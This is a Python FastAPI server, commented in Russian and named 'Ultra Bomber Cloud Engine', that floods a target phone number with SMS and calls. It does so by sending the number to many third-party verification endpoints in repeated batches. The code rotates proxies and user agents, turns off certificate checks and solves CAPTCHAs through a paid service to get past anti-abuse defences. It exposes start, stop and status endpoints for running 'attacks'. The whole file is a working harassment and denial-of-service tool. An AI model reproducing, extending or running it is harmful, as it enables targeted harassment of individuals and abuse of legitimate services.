import uvicorn
import asyncio
import httpx
import random
import json
import sys
import logging
log_config = uvicorn.config.LOGGING_CONFIG
log_config['formatters']['default']['fmt'] = '%(message)s'
log_config['formatters']['access']['fmt'] = '%(message)s'

from fastapi import FastAPI, BackgroundTasks, Query
from fastapi.middleware.cors import CORSMiddleware
from fake_useragent import UserAgent
from twocaptcha import TwoCaptcha

# --- ФУНКЦИЯ ДЛЯ ПУТЕЙ (PyInstaller) ---
def resource_path(relative_path):
    """ Получает абсолютный путь к ресурсам, работает для dev и для PyInstaller """
    try:
        # PyInstaller создает временную папку _MEIPASS
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")
    return os.path.join(base_path, relative_path)

# --- ИНИЦИАЛИЗАЦИЯ ---
app = FastAPI(title="Ultra Bomber Cloud Engine")
ua = UserAgent()

# Разрешаем запросы от твоего HTML-интерфейса
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)

# Настройки капчи
CAPTCHA_API_KEY = "YOUR_2CAPTCHA_KEY"
solver = TwoCaptcha(CAPTCHA_API_KEY) if len(CAPTCHA_API_KEY) > 10 else None

# Реестр активных атак
active_tasks = {}

# Лимиты
SMS_BATCH = 5
SMS_INTERVAL = 5
CALL_INTERVAL = 6
SEMAPHORE_LIMIT = 50
sem = asyncio.Semaphore(SEMAPHORE_LIMIT)

# --- ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ---
def load_data(filename):
    # Используем resource_path для поиска файлов
    path = resource_path(filename)
    if os.path.exists(path):
        with open(path, 'r', encoding='utf-8') as f:
            if filename.endswith('.json'):
                return json.load(f)
            else:
                return [l.strip() for l in f if l.strip()]
    return []

async def solve_captcha(service):
    if not solver or "captcha_sitekey" not in service:
        return None
    try:
        result = await asyncio.to_thread(
            solver.recaptcha, 
            sitekey=service["captcha_sitekey"], 
            url=service["url"]
        )
        return result['code']
    except:
        return None

async def send_request(client, service, phone, proxies):
    async with sem:
        if not active_tasks.get(phone, False):
            return "stopped"

        clean = phone.replace("+380", "").replace("380", "").replace("+", "")
        fmts = {"full": f"380{clean}", "short": f"0{clean}", "raw": clean}
        
        captcha_token = await solve_captcha(service)
        
        # Безопасное форматирование payload
        payload = {}
        for k, v in service.get('data', {}).items():
            if isinstance(v, str):
                payload[k] = v.format(**fmts)
            else:
                payload[k] = v
                
        if captcha_token:
            payload[service.get("captcha_param", "g-recaptcha-response")] = captcha_token

        headers = {
            "User-Agent": ua.random,
            "Referer": service.get("referer", "https://google.com.ua"),
            "Content-Type": "application/json"
        }
        
        proxy_url = random.choice(proxies) if proxies else None
        proxy_cfg = {"http://": proxy_url, "https://": proxy_url} if proxy_url else None
        
        try:
            async with httpx.AsyncClient(proxies=proxy_cfg, verify=False, timeout=10) as p_client:
                resp = await p_client.post(service["url"], json=payload, headers=headers)
                return resp.status_code
        except:
            return None

# --- ФОНОВЫЕ ВОРКЕРЫ ---
async def attack_worker(phone, sms_services, call_services, proxies):
    active_tasks[phone] = True
    
    async def sms_subloop():
        while active_tasks.get(phone):
            if not sms_services: break
            batch = random.sample(sms_services, min(len(sms_services), SMS_BATCH))
            tasks = [send_request(None, s, phone, proxies) for s in batch]
            await asyncio.gather(*tasks)
            await asyncio.sleep(SMS_INTERVAL)

    async def call_subloop():
        while active_tasks.get(phone):
            if not call_services: break
            service = random.choice(call_services)
            await send_request(None, service, phone, proxies)
            await asyncio.sleep(CALL_INTERVAL)

    await asyncio.gather(sms_subloop(), call_subloop())

# --- API ЭНДПОИНТЫ ---
@app.get("/api/start")
async def start_api(number: str, background_tasks: BackgroundTasks):
    target = number.replace("+", "").strip()
    
    if target in active_tasks and active_tasks[target]:
        return {"status": "error", "message": "Атака уже запущена"}

    # Загружаем данные через обновленную функцию load_data
    services = load_data('services.json')
    proxies = load_data('proxies.txt')
    
    sms_s = [s for s in services if s.get('type') == 'sms']
    call_s = [s for s in services if s.get('type') == 'call']

    if not sms_s and not call_s:
        return {"status": "error", "message": "База сервисов пуста или файл не найден"}

    background_tasks.add_task(attack_worker, target, sms_s, call_s, proxies)
    
    return {
        "status": "success", 
        "target": target, 
        "info": "Атака запущена в фоне."
    }

@app.get("/api/stop")
async def stop_api(number: str):
    target = number.replace("+", "").strip()
    if target in active_tasks:
        active_tasks[target] = False
        return {"status": "success", "message": f"Остановлено: {target}"}
    return {"status": "error", "message": "Атака не найдена"}

@app.get("/api/status")
async def status_api():
    active = [num for num, state in active_tasks.items() if state]
    return {"active_attacks": active, "count": len(active)}

# --- ЗАПУСК ---
    # Если хочешь, чтобы при запуске открывался браузер с интерфейсом:
    # import webbrowser
    # webbrowser.open(f"file://{resource_path('index.html')}")
    



if __name__ == '__main__':
    import uvicorn
    import os
    port = int(os.environ.get('PORT', 8888))
    uvicorn.run(app, host='0.0.0.0', port=port)
